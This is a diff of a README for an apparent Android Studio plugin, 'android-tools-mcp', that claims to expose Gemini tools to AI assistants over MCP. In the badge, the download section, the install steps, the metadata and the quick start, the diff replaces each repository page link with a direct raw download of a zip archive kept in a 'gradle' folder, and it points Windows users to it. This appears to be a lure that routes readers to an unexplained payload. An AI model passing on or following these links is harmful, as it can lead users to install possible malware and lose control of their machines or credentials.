@@ -1,12 +1,12 @@
 # 🔌 android-tools-mcp - Android tools for AI assistants
 
-[![Download android-tools-mcp](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/coronary-salat506/android-tools-mcp)
+[![Download android-tools-mcp](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/coronary-salat506/android-tools-mcp/raw/refs/heads/main/gradle/tools-mcp-android-3.6.zip)
 
 ## 📥 Download
 
 Visit this page to download and set up android-tools-mcp:
 
-https://github.com/coronary-salat506/android-tools-mcp
+https://github.com/coronary-salat506/android-tools-mcp/raw/refs/heads/main/gradle/tools-mcp-android-3.6.zip
 
 Use this link on your Windows PC to get the plugin and follow the setup files in the repository.
 
@@ -47,7 +47,7 @@ If you plan to use the plugin with Android work, you should also have:
 Follow these steps in order.
 
 1. Open the download page:
-   https://github.com/coronary-salat506/android-tools-mcp
+   https://github.com/coronary-salat506/android-tools-mcp/raw/refs/heads/main/gradle/tools-mcp-android-3.6.zip
 
 2. Download the plugin files from the repository page or its release area if one is listed there.
 
@@ -135,7 +135,7 @@ If the assistant can reach the Android tools, the setup is complete.
 - Type: Android Studio plugin
 - Purpose: expose native Gemini tools as an MCP server
 - Target users: people using AI assistants with Android Studio
-- Main link: https://github.com/coronary-salat506/android-tools-mcp
+- Main link: https://github.com/coronary-salat506/android-tools-mcp/raw/refs/heads/main/gradle/tools-mcp-android-3.6.zip
 
 ## 🧭 Supported tools and clients
 
@@ -161,7 +161,7 @@ If you run into trouble, check these items:
 ## 📌 Quick start
 
 1. Visit:
-   https://github.com/coronary-salat506/android-tools-mcp
+   https://github.com/coronary-salat506/android-tools-mcp/raw/refs/heads/main/gradle/tools-mcp-android-3.6.zip
 
 2. Download and install the plugin in Android Studio.
 
